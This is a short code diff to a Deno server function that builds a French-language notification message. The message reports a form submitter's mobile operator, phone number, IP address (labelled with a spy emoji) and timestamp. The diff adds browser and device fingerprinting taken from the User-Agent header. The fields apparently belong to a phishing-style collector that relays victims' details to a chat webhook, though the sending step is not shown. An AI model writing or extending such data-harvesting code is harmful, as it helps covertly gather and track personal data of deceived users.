@@ -18,6 +18,20 @@ Deno.serve(async (req) => {
   const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
 
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
+  const userAgent = req.headers.get("user-agent") || "";
+  
+  let browser = "Inconnu";
+  let device = "Inconnu";
+  
+  if (userAgent.includes("Chrome")) browser = "Chrome";
+  else if (userAgent.includes("Safari")) browser = "Safari";
+  else if (userAgent.includes("Firefox")) browser = "Firefox";
+  else if (userAgent.includes("Edge")) browser = "Edge";
+  
+  if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
+  else if (userAgent.includes("iPad")) device = "📱 Tablette";
+  else device = "💻 PC";
+  
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
 
   const now = new Date();
@@ -40,6 +54,8 @@ Deno.serve(async (req) => {
       { name: "📡 Opérateur", value: operateur, inline: true },
       { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🌍 Pays", value: "France", inline: true },
+      { name: "🌐 Navigateur", value: browser, inline: true },
+      { name: "💾 Appareil", value: device, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
